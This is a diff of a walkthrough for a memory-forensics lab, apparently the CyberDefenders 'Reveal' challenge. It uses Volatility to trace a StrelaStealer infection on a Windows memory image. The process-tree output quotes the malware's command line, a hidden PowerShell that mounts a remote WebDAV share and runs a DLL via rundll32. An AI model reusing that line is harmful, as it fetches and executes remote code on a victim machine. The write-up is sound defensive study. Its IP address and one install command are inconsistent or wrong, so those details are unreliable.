@@ -1,105 +1,55 @@
-I've never used Volatility before, and lots of CyberDefenders labs seem to focus on it, so let's dive in and see what it's all about.
-First, I had to actually install Volatility on my Kali VM. That was as easy as:
-git clone https://github.com/volatilityfoundation/volatility3.git
-sudo apt-get install requirements.txt
+I've never used Volatility before, and lots of CyberDefenders labs seem to focus on it. Now is a good time to learn and prepare for a real-world investigation. 
 
+The referenced lab can be found at: https://cyberdefenders.org/blueteam-ctf-challenges/reveal/
 
 Identifying the name of the malicious process helps in understanding the nature of the attack. What is the name of the malicious process?
-The lab told us this is from a Windows machine, so let's run:
+The lab told us this is from a Windows machine Reading the documentation on the tool reveals that the appropriate command is:
 python3 vol.py -f [file] windows.pslist
-Well, that gave us a lot of information, but not necessarily anything fishy catching my eye immediately. Let's try:
+That output a lot of information, but not necessarily anything fishy standing out immediately. Next, the command:
 python3 vol.py -f [file] windows.malware.malfind.Malfind
-This will show us processes that Volatility thinks may have injected code. Eventually, we get an output a little something like this:
-Volatility 3 Framework 2.28.1
-Progress:  100.00               PDB scanning finished                                
-PID     Process Start VPN       End VPN Tag     Protection      CommitCharge    PrivateMemory   File output     Notes   Hexdump Disasm
-
-7848    RuntimeBroker.  0x230013f0000   0x230013fffff   VadS    PAGE_EXECUTE_READ       16      1       Disabled        N/A
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
-0x230013f0000:  add     byte ptr [rax], al
-0x230013f0002:  add     byte ptr [rax], al
-0x230013f0004:  add     byte ptr [rax], al
-0x230013f0006:  add     byte ptr [rax], al
-0x230013f0008:  add     byte ptr [rax], al
-0x230013f000a:  add     byte ptr [rax], al
-0x230013f000c:  add     byte ptr [rax], al
-0x230013f000e:  add     byte ptr [rax], al
-0x230013f0010:  add     byte ptr [rax], al
-0x230013f0012:  add     byte ptr [rax], al
-0x230013f0014:  add     byte ptr [rax], al
-0x230013f0016:  add     byte ptr [rax], al
-0x230013f0018:  add     byte ptr [rax], al
-0x230013f001a:  add     byte ptr [rax], al
-0x230013f001c:  add     byte ptr [rax], al
-0x230013f001e:  add     byte ptr [rax], al
-0x230013f0020:  add     byte ptr [rax], al
-0x230013f0022:  add     byte ptr [rax], al
-0x230013f0024:  add     byte ptr [rax], al
-0x230013f0026:  add     byte ptr [rax], al
-0x230013f0028:  add     byte ptr [rax], al
-0x230013f002a:  add     byte ptr [rax], al
-0x230013f002c:  add     byte ptr [rax], al
-0x230013f002e:  add     byte ptr [rax], al
-0x230013f0030:  add     byte ptr [rax], al
-0x230013f0032:  add     byte ptr [rax], al
-0x230013f0034:  add     byte ptr [rax], al
-0x230013f0036:  add     byte ptr [rax], al
-0x230013f0038:  add     byte ptr [rax], al
-0x230013f003a:  add     byte ptr [rax], al
-0x230013f003c:  add     byte ptr [rax], al
-0x230013f003e:  add     byte ptr [rax], al
-4492    thunderbird.ex  0x1bfe20e0000   0x1bfe20effff   VadS    PAGE_EXECUTE_READ       16      1       Disabled        N/A
+will show us processes that Volatility thinks may have injected code. Eventually, this output is returned:
+[...]
+7848    RuntimeBroker.  0x230013f0000   0x230013fffff   VadS    PAGE_EXECUTE_READ       16      1       Disabled        [...]
+4492    thunderbird.ex  0x1bfe20e0000   0x1bfe20effff   VadS    PAGE_EXECUTE_READ       16      1       Disabled        [...]
 30 30 cd cd 3f 7e 00 00 36 00 00 00 00 00 00 00 00..?~..6.......
 48 8d 15 f9 ff ff ff 48 8b 0c 24 55 53 56 57 41 H......H..$USVWA
 56 41 57 48 8b ec 48 83 ec 38 48 8b 7a f0 48 8d VAWH..H..8H.z.H.
 05 1b 1a ff ff 48 8b 5a f8 48 03 c7 4c 8b 31 48 .....H.Z.H..L.1H
-0x1bfe20e0000:  xor     byte ptr [rax], dh
-0x1bfe20e0002:  int     0xcd
-
-Well, it didn't like RuntimeBroker.exe or thunderbird.exe as answers, let's keep looking. And eventually we discover that the answer is powershell.exe. Interesting!
-
+[...]
+It didn't seem that RuntimeBroker.exe or thunderbird.exe were correct, so further investigation was necessary. And eventually, I realized the answer is powershell.exe.
 
 
 Knowing the parent process ID (PPID) of the malicious process aids in tracing the process hierarchy and understanding the attack flow. What is the parent PID of the malicious process?
-From the previous question, we know powershell.exe is PID 3692. Let's run:
+From the previous question, it is given that powershell.exe is PID 3692. The next step should be:
 python3 vol.py -f [file] windows.pstree | grep 3692
-This will show us the process TREE for process 3692, meaning it will show us parent and child processes of powershell.exe. We get a little something like:
+This will show the process tree for process 3692, meaning it will show the parent and child processes of powershell.exe:
 3692    4120    powershell.exe  0xc90c0358b080  17      -       1       False   2024-07-15 07:00:03.000000 UTC  N/A     \Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 * 2416  3692    net.exe 0xc90c08fd6080  5       -       1       False   2024-07-15 07:00:06.000000 UTC  N/A     \Device\HarddiskVolume3\Windows\System32\net.exe        "C:\Windows\system32\net.exe" use \\45.9.74.32@8888\davwwwroot\    C:\Windows\system32\net.exe
 * 6892  3692    conhost.exe     0xc90c0a09b0c0  5       -       1       False   2024-07-15 07:00:03.000000 UTC  N/A     \Device\HarddiskVolume3\Windows\System32\conhost.exe    \??\C:\Windows\system32\conhost.exe 0x4    C:\Windows\system32\conhost.exe
 
-Context clues will tell us the first PID must be the child and the second is the parent. So the answer is 4120.
-
+Context clues will uncover that the first PID must be the child and the second is the parent. So the answer is 4120.
 
 
 Determining the file name used by the malware for executing the second-stage payload is crucial for identifying subsequent malicious activities. What is the file name that the malware uses to execute the second-stage payload?
-Well we see from the first line of output in the previous step that there is a nifty little line showing:
+From the first line of output in the previous step, it is known that there is a line showing:
 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
-Certainly looks a little odd to me, and we know DLLs can be manipulated to be malicious, so 3435.dll is the answer.
-
+DLLs can be manipulated to be malicious, so 3435.dll is the answer.
 
 
 Identifying the shared directory on the remote server helps trace the resources targeted by the attacker. What is the name of the shared directory being accessed on the remote server?
-Also in the previous line. \\45.9.74.32@8888 signifies trying to get to a server at 45.9.74.32 and on port 8888. The next piece, davwwwroot, would be the directory accessed.
-
+Also in the previous line, \\45.9.74.32@8888 signifies the attacker trying to get to a server at 45.9.74.32 and on port 8888. The next piece, davwwwroot, would be the directory accessed.
 
 
 What is the MITRE ATT&CK sub-technique ID that describes the execution of a second-stage payload using a Windows utility to run the malicious file?
-This is a simple Google search: T1218.011.
-
+OSINT reveals the answer to be: T1218.011.
 
 
 Identifying the username under which the malicious process runs helps in assessing the compromised account and its potential impact. What is the username that the malicious process runs under?
-For this one, let's run:
+This command should give useful output:
 python3 vol.py -f [file] windows.sessions
 This will show us the username for each process:
 1       -       3692    powershell.exe  DESKTOP-T51LU0E/Elon    2024-07-15 07:00:03.000000 UTC
 
 
-
-
 Knowing the name of the malware family is essential for correlating the attack with known threats and developing appropriate defenses. What is the name of the malware family?
-For this, I just searched 45.9.72.32 on VirusTotal: STRELASTEALER
+VirusTotal will help by showing whether anyone is reporting 45.9.72.32 as malicious. If so, it also gives details as to why. VirusTotal reveals the answer to be STRELASTEALER
